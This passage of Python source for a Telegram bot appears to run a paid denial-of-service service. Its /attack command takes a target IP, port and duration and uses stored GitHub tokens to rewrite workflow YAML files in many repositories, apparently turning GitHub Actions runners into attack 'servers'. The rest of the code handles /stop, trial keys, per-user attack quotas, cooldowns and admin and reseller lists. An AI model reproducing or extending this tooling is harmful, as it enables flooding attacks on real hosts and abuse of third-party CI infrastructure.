        return
    
    if len(context.args) != 3:
        await update.message.reply_text(
            "❌ **ɪɴᴠᴀʟɪᴅ sʏɴᴛᴀx**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴜsᴀɢᴇ: /attack <ɪᴘ> <ᴘᴏʀᴛ> <ᴛɪᴍᴇ>\n\n"
            "ᴇxᴀᴍᴘʟᴇ: /attack 1.1.1.1 80 60"
        )
        return
    
    if not github_tokens:
        await update.message.reply_text(
            "❌ **ɴᴏ sᴇʀᴠᴇʀs ᴀᴠᴀɪʟᴀʙʟᴇ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ɴᴏ sᴇʀᴠᴇʀs ᴀᴠᴀɪʟᴀʙʟᴇ. ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ."
        )
        return
    
    ip, port, time_val = context.args
    
    if not is_valid_ip(ip):
        await update.message.reply_text(
            "⚠️ **ɪɴᴠᴀʟɪᴅ ɪᴘ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ɪᴘs sᴛᴀʀᴛɪɴɢ ᴡɪᴛʜ '15' ᴏʀ '96' ᴀʀᴇ ɴᴏᴛ ᴀʟʟᴏᴡᴇᴅ."
        )
        return
    
    method, method_name = get_attack_method(ip)
    if method is None:
        await update.message.reply_text(
            f"⚠️ **ɪɴᴠᴀʟɪᴅ ɪᴘ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{method_name}"
        )
        return
    
    try:
        attack_duration = int(time_val)
        if attack_duration <= 0:
            await update.message.reply_text(
                "❌ **ɪɴᴠᴀʟɪᴅ ᴛɪᴍᴇ**\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "ᴛɪᴍᴇ ᴍᴜsᴛ ʙᴇ ᴀ ᴘᴏsɪᴛɪᴠᴇ ɴᴜᴍʙᴇʀ"
            )
            return
    except ValueError:
        await update.message.reply_text(
            "❌ **ɪɴᴠᴀʟɪᴅ ᴛɪᴍᴇ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴛɪᴍᴇ ᴍᴜsᴛ ʙᴇ ᴀ ɴᴜᴍʙᴇʀ"
        )
        return
    
    start_attack(ip, port, time_val, user_id, method)
    
    progress_msg = await update.message.reply_text(
        "🔄 **sᴛᴀʀᴛɪɴɢ ᴀᴛᴛᴀᴄᴋ...**"
    )
    
    success_count = 0
    fail_count = 0
    
    threads = []
    results = []
    
    def update_single_token(token_data):
        try:
            result = update_yml_file(
                token_data['token'], 
                token_data['repo'], 
                ip, port, time_val, method
            )
            results.append((token_data['username'], result))
        except Exception as e:
            results.append((token_data['username'], False))
    
    for token_data in github_tokens:
        thread = threading.Thread(target=update_single_token, args=(token_data,))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    for username, success in results:
        if success:
            success_count += 1
        else:
            fail_count += 1
    
    
    user_id_str = str(user_id)
    remaining_attacks = MAX_ATTACKS - user_attack_counts.get(user_id_str, 0)
    
    message = (
        f"🎯 **ᴀᴛᴛᴀᴄᴋ sᴛᴀʀᴛᴇᴅ!**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 ᴛᴀʀɢᴇᴛ: `{ip}`\n"
        f"🚪 ᴘᴏʀᴛ: `{port}`\n"
        f"⏱️ ᴛɪᴍᴇ: `{time_val}s`\n"
        f"🖥️ sᴇʀᴠᴇʀs: `{success_count}`\n"
        f"⚡ ᴍᴇᴛʜᴏᴅ: {method_name}\n"
        f"⏳ ᴄᴏᴏʟᴅᴏᴡɴ: {COOLDOWN_DURATION}s ᴀғᴛᴇʀ ᴀᴛᴛᴀᴄᴋ\n"
        f"🎯 ʀᴇᴍᴀɪɴɪɴɢ ᴀᴛᴛᴀᴄᴋs: {remaining_attacks}/{MAX_ATTACKS}"
    )
    
    await progress_msg.edit_text(message)
    
    def monitor_attack_completion():
        time.sleep(attack_duration)
        finish_attack()
        logger.info(f"Attack completed automatically after {attack_duration} seconds")
    
    monitor_thread = threading.Thread(target=monitor_attack_completion)
    monitor_thread.daemon = True
    monitor_thread.start()

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not can_user_attack(user_id):
        await update.message.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ."
        )
        return
    
    attack_status = get_attack_status()
    
    if attack_status["status"] == "running":
        attack = attack_status["attack"]
        message = (
            "🔥 **ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 ᴛᴀʀɢᴇᴛ: `{attack['ip']}:{attack['port']}`\n"
            f"⏱️ ᴇʟᴀᴘsᴇᴅ: `{attack_status['elapsed']}s`\n"
            f"⏳ ʀᴇᴍᴀɪɴɪɴɢ: `{attack_status['remaining']}s`\n"
            f"⚡ ᴍᴇᴛʜᴏᴅ: `{attack['method']}`"
        )
    
    elif attack_status["status"] == "cooldown":
        message = (
            "⏳ **ᴄᴏᴏʟᴅᴏᴡɴ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳ ʀᴇᴍᴀɪɴɪɴɢ: `{attack_status['remaining_cooldown']}s`\n"
            f"⏰ ɴᴇxᴛ ᴀᴛᴛᴀᴄᴋ ɪɴ: `{attack_status['remaining_cooldown']}s`"
        )
    
    else:
        message = (
            "✅ **ʀᴇᴀᴅʏ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ɴᴏ ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ.\n"
            "ʏᴏᴜ ᴄᴀɴ sᴛᴀʀᴛ ᴀ ɴᴇᴡ ᴀᴛᴛᴀᴄᴋ."
        )
    
    await update.message.reply_text(message)

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not can_user_attack(user_id):
        await update.message.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ."
        )
        return
    
    attack_status = get_attack_status()
    
    if attack_status["status"] != "running":
        await update.message.reply_text(
            "❌ **ɴᴏ ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ɴᴏ ᴀᴛᴛᴀᴄᴋ ɪs ʀᴜɴɴɪɴɢ."
        )
        return
    
    if not github_tokens:
        await update.message.reply_text(
            "❌ **ɴᴏ sᴇʀᴠᴇʀs ᴀᴠᴀɪʟᴀʙʟᴇ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ɴᴏ sᴇʀᴠᴇʀs ᴀᴅᴅᴇᴅ."
        )
        return
    
    progress_msg = await update.message.reply_text(
        "🛑 **sᴛᴏᴘᴘɪɴɢ ᴀᴛᴛᴀᴄᴋ...**"
    )
    
    total_stopped = 0
    success_count = 0
    
    threads = []
    results = []
    
    def stop_single_token(token_data):
        try:
            stopped = instant_stop_all_jobs(
                token_data['token'], 
                token_data['repo']
            )
            results.append((token_data['username'], stopped))
        except Exception as e:
            results.append((token_data['username'], 0))
    
    for token_data in github_tokens:
        thread = threading.Thread(target=stop_single_token, args=(token_data,))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    for username, stopped in results:
        total_stopped += stopped
        if stopped > 0:
            success_count += 1
    
    stop_attack()
    
    message = (
        f"🛑 **ᴀᴛᴛᴀᴄᴋ sᴛᴏᴘᴘᴇᴅ**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ ᴡᴏʀᴋғʟᴏᴡs ᴄᴀɴᴄᴇʟʟᴇᴅ: {total_stopped}\n"
        f"✅ sᴇʀᴠᴇʀs: {success_count}/{len(github_tokens)}\n"
        f"⏳ ᴄᴏᴏʟᴅᴏᴡɴ: {COOLDOWN_DURATION}s"
    )
    
    await progress_msg.edit_text(message)


async def removexpiredtoken_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴏɴʟʏ ᴏᴡɴᴇʀs ᴄᴀɴ ʀᴇᴍᴏᴠᴇ ᴇxᴘɪʀᴇᴅ ᴛᴏᴋᴇɴs."
        )
        return
    
    
    valid_tokens = []
    expired_tokens = []
    
    for token_data in github_tokens:
        try:
            g = Github(token_data['token'])
            user = g.get_user()
            
            _ = user.login
            valid_tokens.append(token_data)
        except:
            expired_tokens.append(token_data)
    
    if not expired_tokens:
        await update.message.reply_text("✅ ᴀʟʟ ᴛᴏᴋᴇɴs ᴀʀᴇ ᴠᴀʟɪᴅ.")
        return
    
    
    github_tokens.clear()
    github_tokens.extend(valid_tokens)
    save_github_tokens(github_tokens)
    
    expired_list = "🗑️ **ᴇxᴘɪʀᴇᴅ ᴛᴏᴋᴇɴs ʀᴇᴍᴏᴠᴇᴅ:**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for token in expired_tokens:
        expired_list += f"• `{token['username']}` - {token['repo']}\n"
    
    expired_list += f"\n📊 **ʀᴇᴍᴀɪɴɪɴɢ ᴛᴏᴋᴇɴs:** {len(valid_tokens)}"
    await update.message.reply_text(expired_list)


async def remove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ɪs ғᴏʀ ᴀᴅᴍɪɴs ᴏɴʟʏ."
        )
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "❌ **ɪɴᴠᴀʟɪᴅ sʏɴᴛᴀx**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴜsᴀɢᴇ: /remove <ᴜsᴇʀ_ɪᴅ>\n"
            "ᴇxᴀᴍᴘʟᴇ: /remove 12345678"
        )
        return
    
    try:
        user_to_remove = int(context.args[0])
        user_to_remove_str = str(user_to_remove)
        
        removed = False
        
        
        if user_to_remove_str in approved_users:
            del approved_users[user_to_remove_str]
            save_approved_users(approved_users)
            removed = True
        
        
        pending_users[:] = [u for u in pending_users if str(u['user_id']) != user_to_remove_str]
        save_pending_users(pending_users)
        
        
        if user_to_remove_str in user_attack_counts:
            del user_attack_counts[user_to_remove_str]
            save_user_attack_counts(user_attack_counts)
        
        if removed:
            await update.message.reply_text(
                f"✅ **ᴜsᴇʀ ᴀᴄᴄᴇss ʀᴇᴍᴏᴠᴇᴅ**\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"ᴜsᴇʀ ɪᴅ: `{user_to_remove}`\n"
                f"ʀᴇᴍᴏᴠᴇᴅ ʙʏ: `{user_id}`"
            )
            
            
            try:
                await context.bot.send_message(
                    chat_id=user_to_remove,
                    text="🚫 **ʏᴏᴜʀ ᴀᴄᴄᴇss ʜᴀs ʙᴇᴇɴ ʀᴇᴍᴏᴠᴇᴅ**\n━━━━━━━━━━━━━━━━━━━━━━\nʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏ ᴛʜᴇ ʙᴏᴛ ʜᴀs ʙᴇᴇɴ ʀᴇᴠᴏᴋᴇᴅ. ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ ғᴏʀ ᴍᴏʀᴇ ɪɴғᴏʀᴍᴀᴛɪᴏɴ."
                )
            except:
                pass
        else:
            await update.message.reply_text(
                f"❌ **ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ**\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"ᴜsᴇʀ ɪᴅ `{user_to_remove}` ɴᴏᴛ ғᴏᴜɴᴅ ɪɴ ᴀᴘᴘʀᴏᴠᴇᴅ ᴜsᴇʀs."
            )
        
    except ValueError:
        await update.message.reply_text("❌ ɪɴᴠᴀʟɪᴅ ᴜsᴇʀ ɪᴅ")


async def gentrailkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ɪs ғᴏʀ ᴀᴅᴍɪɴs ᴏɴʟʏ."
        )
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "❌ **ɪɴᴠᴀʟɪᴅ sʏɴᴛᴀx**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴜsᴀɢᴇ: /gentrailkey <ʜᴏᴜʀs>\n"
            "ᴇxᴀᴍᴘʟᴇ: /gentrailkey 24"
        )
        return
    
    try:
        hours = int(context.args[0])
        if hours < 1 or hours > 720:  
            await update.message.reply_text("❌ ʜᴏᴜʀs ᴍᴜsᴛ ʙᴇ ʙᴇᴛᴡᴇᴇɴ 1 ᴀɴᴅ 720 (30 ᴅᴀʏs)")
            return
        
        key = generate_trial_key(hours)
        
        await update.message.reply_text(
            f"🔑 **ᴛʀɪᴀʟ ᴋᴇʏ ɢᴇɴᴇʀᴀᴛᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"ᴋᴇʏ: `{key}`\n"
            f"ᴅᴜʀᴀᴛɪᴏɴ: {hours} ʜᴏᴜʀs\n"
            f"ᴇxᴘɪʀᴇs: ɪɴ {hours} ʜᴏᴜʀs\n\n"
            "ᴜsᴇʀs ᴄᴀɴ ʀᴇᴅᴇᴇᴍ ᴡɪᴛʜ:\n"
            f"`/redeem {key}`"
        )
        
    except ValueError:
        await update.message.reply_text("❌ ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ ᴏғ ʜᴏᴜʀs")


async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "❌ **ɪɴᴠᴀʟɪᴅ sʏɴᴛᴀx**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴜsᴀɢᴇ: /redeem <ᴋᴇʏ>\n"
            "ᴇxᴀᴍᴘʟᴇ: /redeem TRL-ABCD-1234-EFGH"
        )
        return
    
    key = context.args[0].upper()
    
    
    if can_user_attack(user_id):
        await update.message.reply_text(
            "⚠️ **ʏᴏᴜ ᴀʟʀᴇᴀᴅʏ ʜᴀᴠᴇ ᴀᴄᴄᴇss**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ʏᴏᴜ ᴀʟʀᴇᴀᴅʏ ʜᴀᴠᴇ ᴀᴄᴄᴇss ᴛᴏ ᴛʜᴇ ʙᴏᴛ. ɴᴏ ɴᴇᴇᴅ ᴛᴏ ʀᴇᴅᴇᴇᴍ ᴀ ᴛʀɪᴀʟ ᴋᴇʏ."
        )
        return
    
    success, message = redeem_trial_key(key, user_id)
    
    if success:
        await update.message.reply_text(
            f"✅ **ᴛʀɪᴀʟ ᴀᴄᴛɪᴠᴀᴛᴇᴅ!**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{message}\n\n"
            "ʏᴏᴜ ᴄᴀɴ ɴᴏᴡ ᴜsᴇ /start ᴛᴏ ᴀᴄᴄᴇss ᴛʜᴇ ʙᴏᴛ."
        )
    else:
        await update.message.reply_text(
            f"❌ **ғᴀɪʟᴇᴅ ᴛᴏ ʀᴇᴅᴇᴇᴍ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{message}"
        )


async def setmaxattack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴏɴʟʏ ᴏᴡɴᴇʀs ᴄᴀɴ sᴇᴛ ᴍᴀxɪᴍᴜᴍ ᴀᴛᴛᴀᴄᴋs."
        )
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "❌ **ɪɴᴠᴀʟɪᴅ sʏɴᴛᴀx**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴜsᴀɢᴇ: /setmaxattack <ɴᴜᴍʙᴇʀ>\n"
            "ᴇxᴀᴍᴘʟᴇ: /setmaxattack 3"
        )
        return
    
    try:
        max_attacks = int(context.args[0])
        if max_attacks < 1 or max_attacks > 100:
            await update.message.reply_text("❌ ᴍᴀxɪᴍᴜᴍ ᴀᴛᴛᴀᴄᴋs ᴍᴜsᴛ ʙᴇ ʙᴇᴛᴡᴇᴇɴ 1 ᴀɴᴅ 100")
            return
        
        global MAX_ATTACKS
        MAX_ATTACKS = max_attacks
        save_max_attacks(max_attacks)
        
        await update.message.reply_text(
            f"✅ **ᴍᴀxɪᴍᴜᴍ ᴀᴛᴛᴀᴄᴋs ᴜᴘᴅᴀᴛᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"ɴᴇᴡ ʟɪᴍɪᴛ: `{MAX_ATTACKS}` ᴀᴛᴛᴀᴄᴋ(s) ᴘᴇʀ ᴜsᴇʀ"
        )
    except ValueError:
        await update.message.reply_text("❌ ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ")


async def userslist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ɪs ғᴏʀ ᴀᴅᴍɪɴs ᴏɴʟʏ."
        )
        return
    
    if not approved_users:
        await update.message.reply_text("📭 ɴᴏ ᴀᴘᴘʀᴏᴠᴇᴅ ᴜsᴇʀs")
        return
    
    users_list = "👤 **ᴀᴘᴘʀᴏᴠᴇᴅ ᴜsᴇʀs ʟɪsᴛ**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    count = 1
    for uid, user_info in approved_users.items():
        username = user_info.get('username', f'user_{uid}')
        days = user_info.get('days', '?')
        
        
        expiry = user_info.get('expiry', 'LIFETIME')
        if expiry == "LIFETIME":
            remaining = "ʟɪғᴇᴛɪᴍᴇ"
        else:
            try:
                expiry_time = float(expiry)
                current_time = time.time()
                if current_time > expiry_time:
                    remaining = "ᴇxᴘɪʀᴇᴅ"
                else:
                    days_left = int((expiry_time - current_time) / (24 * 3600))
                    hours_left = int(((expiry_time - current_time) % (24 * 3600)) / 3600)
                    remaining = f"{days_left}ᴅ {hours_left}ʜ"
            except:
                remaining = "ᴜɴᴋɴᴏᴡɴ"
        
        users_list += f"{count}. `{uid}` - @{username} ({days} ᴅᴀʏs) | ʀᴇᴍᴀɪɴɪɴɢ: {remaining}\n"
        count += 1
    
    users_list += f"\n📊 **ᴛᴏᴛᴀʟ ᴜsᴇʀs:** {len(approved_users)}"
    await update.message.reply_text(users_list)


async def maintenance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴏɴʟʏ ᴏᴡɴᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ."
        )
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "❌ **ɪɴᴠᴀʟɪᴅ sʏɴᴛᴀx**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴜsᴀɢᴇ: /maintenance <ᴏɴ/ᴏғғ>\n"
            "ᴇxᴀᴍᴘʟᴇ: /maintenance ᴏɴ"
        )
        return
    
    mode = context.args[0].lower()
    global MAINTENANCE_MODE
    
    if mode == "on":
        MAINTENANCE_MODE = True
        save_maintenance_mode(True)
        await update.message.reply_text(
            "🔧 **ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ ᴇɴᴀʙʟᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ʙᴏᴛ ɪs ɴᴏᴡ ᴜɴᴅᴇʀ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ.\n"
            "ᴏɴʟʏ ᴀᴅᴍɪɴs ᴄᴀɴ ᴜsᴇ ᴛʜᴇ ʙᴏᴛ."
        )
    elif mode == "off":
        MAINTENANCE_MODE = False
        save_maintenance_mode(False)
        await update.message.reply_text(
            "✅ **ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ ᴅɪsᴀʙʟᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ʙᴏᴛ ɪs ɴᴏᴡ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴏʀ ᴀʟʟ ᴜsᴇʀs."
        )
    else:
        await update.message.reply_text("❌ ɪɴᴠᴀʟɪᴅ ᴍᴏᴅᴇ. ᴜsᴇ 'ᴏɴ' ᴏʀ 'ᴏғғ'")


async def setcooldown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴏɴʟʏ ᴏᴡɴᴇʀs ᴄᴀɴ sᴇᴛ ᴄᴏᴏʟᴅᴏᴡɴ."
        )
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "❌ **ɪɴᴠᴀʟɪᴅ sʏɴᴛᴀx**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴜsᴀɢᴇ: /setcooldown <sᴇᴄᴏɴᴅs>\n"
            "ᴇxᴀᴍᴘʟᴇ: /setcooldown 300"
        )
        return
    
    try:
        new_cooldown = int(context.args[0])
        if new_cooldown < 10:
            await update.message.reply_text("❌ ᴄᴏᴏʟᴅᴏᴡɴ ᴍᴜsᴛ ʙᴇ ᴀᴛ ʟᴇᴀsᴛ 10 sᴇᴄᴏɴᴅs")
            return
        
        global COOLDOWN_DURATION
        COOLDOWN_DURATION = new_cooldown
        save_cooldown(new_cooldown)
        
        await update.message.reply_text(
            f"✅ **ᴄᴏᴏʟᴅᴏᴡɴ ᴜᴘᴅᴀᴛᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"ɴᴇᴡ ᴄᴏᴏʟᴅᴏᴡɴ: `{COOLDOWN_DURATION}` sᴇᴄᴏɴᴅs"
        )
    except ValueError:
        await update.message.reply_text("❌ ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ")


async def add_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ɪs ғᴏʀ ᴀᴅᴍɪɴs ᴏɴʟʏ."
        )
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(
            "❌ **ɪɴᴠᴀʟɪᴅ sʏɴᴛᴀx**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴜsᴀɢᴇ: /add <ɪᴅ> <ᴅᴀʏs>\n"
            "ᴇxᴀᴍᴘʟᴇ: /add 123456 7"
        )
        return
    
    try:
        new_user_id = int(context.args[0])
        days = int(context.args[1])
        
        
        pending_users[:] = [u for u in pending_users if str(u['user_id']) != str(new_user_id)]
        save_pending_users(pending_users)
        
        
        if days == 0:
            expiry = "LIFETIME"
        else:
            expiry = time.time() + (days * 24 * 60 * 60)
        
        
        approved_users[str(new_user_id)] = {
            "username": update.effective_user.username or f"user_{new_user_id}",
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "expiry": expiry,
            "days": days
        }
        save_approved_users(approved_users)
        
        
        try:
            await context.bot.send_message(
                chat_id=new_user_id,
                text=f"✅ **ᴀᴄᴄᴇss ᴀᴘᴘʀᴏᴠᴇᴅ!**\n━━━━━━━━━━━━━━━━━━━━━━\nʏᴏᴜʀ ᴀᴄᴄᴇss ʜᴀs ʙᴇᴇɴ ᴀᴘᴘʀᴏᴠᴇᴅ ғᴏʀ {days} ᴅᴀʏs.\nᴜsᴇ /start ᴛᴏ ᴀᴄᴄᴇss ᴛʜᴇ ʙᴏᴛ."
            )
        except:
            pass
        
        await update.message.reply_text(
            f"✅ **ᴜsᴇʀ ᴀᴅᴅᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"ᴜsᴇʀ ɪᴅ: `{new_user_id}`\n"
            f"ᴅᴜʀᴀᴛɪᴏɴ: {days} ᴅᴀʏs\n"
            f"ᴀᴅᴅᴇᴅ ʙʏ: `{user_id}`"
        )
        
    except ValueError:
        await update.message.reply_text("❌ ɪɴᴠᴀʟɪᴅ ᴜsᴇʀ ɪᴅ ᴏʀ ᴅᴀʏs")

async def approveuserslist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ɪs ғᴏʀ ᴀᴅᴍɪɴs ᴏɴʟʏ."
        )
        return
    
    if not pending_users:
        await update.message.reply_text("📭 ɴᴏ ᴘᴇɴᴅɪɴɢ ʀᴇǫᴜᴇsᴛs")
        return
    
    pending_list = "⏳ **ᴘᴇɴᴅɪɴɢ ʀᴇǫᴜᴇsᴛs**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for user in pending_users:
        pending_list += f"• `{user['user_id']}` - @{user['username']}\n"
    
    pending_list += f"\nᴛᴏ ᴀᴘᴘʀᴏᴠᴇ: /add <ɪᴅ> <ᴅᴀʏs>"
    await update.message.reply_text(pending_list)

async def ownerlist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ɪs ғᴏʀ ᴀᴅᴍɪɴs ᴏɴʟʏ."
        )
        return
    
    owners_list = "👑 **ᴏᴡɴᴇʀs ʟɪsᴛ**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for owner_id, owner_info in owners.items():
        username = owner_info.get('username', f'owner_{owner_id}')
        is_primary = owner_info.get('is_primary', False)
        added_by = owner_info.get('added_by', 'system')
        owners_list += f"• `{owner_id}` - @{username}"
        if is_primary:
            owners_list += " 👑 (ᴘʀɪᴍᴀʀʏ)"
        owners_list += f"\n  ᴀᴅᴅᴇᴅ ʙʏ: `{added_by}`\n"
    
    await update.message.reply_text(owners_list)

async def adminlist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ɪs ғᴏʀ ᴀᴅᴍɪɴs ᴏɴʟʏ."
        )
        return
    
    if not admins:
        await update.message.reply_text("📭 ɴᴏ ᴀᴅᴍɪɴs")
        return
    
    admins_list = "🛡️ **ᴀᴅᴍɪɴs ʟɪsᴛ**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for admin_id, admin_info in admins.items():
        username = admin_info.get('username', f'admin_{admin_id}')
        admins_list += f"• `{admin_id}` - @{username}\n"
    
    await update.message.reply_text(admins_list)

async def resellerlist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ɪs ғᴏʀ ᴀᴅᴍɪɴs ᴏɴʟʏ."
        )
        return
    
    if not resellers:
        await update.message.reply_text("📭 ɴᴏ ʀᴇsᴇʟʟᴇʀs")
        return
    
